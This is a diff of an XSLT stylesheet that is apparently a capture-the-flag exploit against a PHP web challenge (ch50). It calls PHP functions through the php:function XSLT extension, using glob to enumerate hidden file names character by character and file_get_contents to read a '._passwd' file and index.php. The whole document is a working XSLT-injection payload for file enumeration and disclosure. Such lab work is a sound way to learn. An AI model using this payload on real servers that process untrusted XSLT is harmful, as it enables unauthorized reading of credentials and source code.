@@ -2,38 +2,38 @@
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
 xmlns:php="http://php.net/xsl"              
 >	
-<xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/._pa*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/._pb*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/._pc*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandled"    select="php:function('glob','/challenge/web-serveur/ch50/._pd*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlee"    select="php:function('glob','/challenge/web-serveur/ch50/._pe*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlef"    select="php:function('glob','/challenge/web-serveur/ch50/._pf*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandleg"    select="php:function('glob','/challenge/web-serveur/ch50/._pg*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandleh"    select="php:function('glob','/challenge/web-serveur/ch50/._ph*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlei"    select="php:function('glob','/challenge/web-serveur/ch50/._pi*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlej"    select="php:function('glob','/challenge/web-serveur/ch50/._pj*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlek"    select="php:function('glob','/challenge/web-serveur/ch50/._pk*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlel"    select="php:function('glob','/challenge/web-serveur/ch50/._pl*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlem"    select="php:function('glob','/challenge/web-serveur/ch50/._pm*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlen"    select="php:function('glob','/challenge/web-serveur/ch50/._pn*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandleo"    select="php:function('glob','/challenge/web-serveur/ch50/._po*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlep"    select="php:function('glob','/challenge/web-serveur/ch50/._pp*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandleq"    select="php:function('glob','/challenge/web-serveur/ch50/._pq*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandler"    select="php:function('glob','/challenge/web-serveur/ch50/._pr*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandles"    select="php:function('glob','/challenge/web-serveur/ch50/._ps*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlet"    select="php:function('glob','/challenge/web-serveur/ch50/._pt*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandleu"    select="php:function('glob','/challenge/web-serveur/ch50/._pu*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlev"    select="php:function('glob','/challenge/web-serveur/ch50/._pv*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlew"    select="php:function('glob','/challenge/web-serveur/ch50/._pw*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlex"    select="php:function('glob','/challenge/web-serveur/ch50/._px*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandley"    select="php:function('glob','/challenge/web-serveur/ch50/._py*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandlez"    select="php:function('glob','/challenge/web-serveur/ch50/._pz*')" disable-output-escaping="yes"/>
-<xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/._p_*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/._pha*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/._phb*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/._phc*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandled"    select="php:function('glob','/challenge/web-serveur/ch50/._phd*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlee"    select="php:function('glob','/challenge/web-serveur/ch50/._phe*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlef"    select="php:function('glob','/challenge/web-serveur/ch50/._phf*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandleg"    select="php:function('glob','/challenge/web-serveur/ch50/._phg*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandleh"    select="php:function('glob','/challenge/web-serveur/ch50/._phh*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlei"    select="php:function('glob','/challenge/web-serveur/ch50/._phi*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlej"    select="php:function('glob','/challenge/web-serveur/ch50/._phj*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlek"    select="php:function('glob','/challenge/web-serveur/ch50/._phk*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlel"    select="php:function('glob','/challenge/web-serveur/ch50/._phl*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlem"    select="php:function('glob','/challenge/web-serveur/ch50/._phm*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlen"    select="php:function('glob','/challenge/web-serveur/ch50/._phn*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandleo"    select="php:function('glob','/challenge/web-serveur/ch50/._pho*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlep"    select="php:function('glob','/challenge/web-serveur/ch50/._php*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandleq"    select="php:function('glob','/challenge/web-serveur/ch50/._phq*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandler"    select="php:function('glob','/challenge/web-serveur/ch50/._phr*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandles"    select="php:function('glob','/challenge/web-serveur/ch50/._phs*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlet"    select="php:function('glob','/challenge/web-serveur/ch50/._pht*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandleu"    select="php:function('glob','/challenge/web-serveur/ch50/._phu*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlev"    select="php:function('glob','/challenge/web-serveur/ch50/._phv*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlew"    select="php:function('glob','/challenge/web-serveur/ch50/._phw*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlex"    select="php:function('glob','/challenge/web-serveur/ch50/._phx*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandley"    select="php:function('glob','/challenge/web-serveur/ch50/._phy*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandlez"    select="php:function('glob','/challenge/web-serveur/ch50/._phz*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/._ph_*')" disable-output-escaping="yes"/>
 
 <xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/._passwd')" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <xsl:template match="/">	
-  SCANDIR0 ._pa*:<xsl:value-of select="$shandlea"/> 
+  SCANDIR0 ._pha*:<xsl:value-of select="$shandlea"/> 
   SCANDIR0 .b*:<xsl:value-of select="$shandleb"/> 
   SCANDIR0 .c*:<xsl:value-of select="$shandlec"/> 
   SCANDIR0 .d*:<xsl:value-of select="$shandled"/> 
